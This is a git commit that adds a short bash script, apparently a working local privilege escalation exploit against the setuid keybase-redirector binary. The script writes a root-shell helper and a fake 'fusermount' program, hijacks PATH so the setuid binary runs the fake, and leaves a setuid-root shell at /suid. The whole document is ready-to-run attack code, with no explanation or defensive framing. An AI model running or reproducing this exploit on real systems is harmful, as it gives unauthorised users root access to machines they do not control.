e18021ac76c0c74fd5bc727d72cf022103ca9489
sai <lastleaf404@gmail.com>
2019-05-28 18:28:25 +0630

    Create kb-rd_lpe_exp.sh

---
+++ kb-rd_lpe_exp.sh
@@ -0,0 +1,26 @@
+#!/bin/bash
+# @404death
+# setuid keybase-redirector exploit 
+
+cat <<EOF > suid.c
+int main(void){
+  setresuid(0, 0, 0);
+  system("/bin/bash");
+}
+EOF
+cat >fusermount.c<<EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int main(int argc, char **argv)
+{
+  setreuid(0,0);
+  system("/usr/bin/gcc /home/tyken/suid.c -o /suid && /usr/bin/chmod +s /suid");
+  return(0);
+}
+EOF
+gcc -Wall fusermount.c -o fusermount
+env PATH=.:$PATH /usr/bin/keybase-redirector /keybase
+
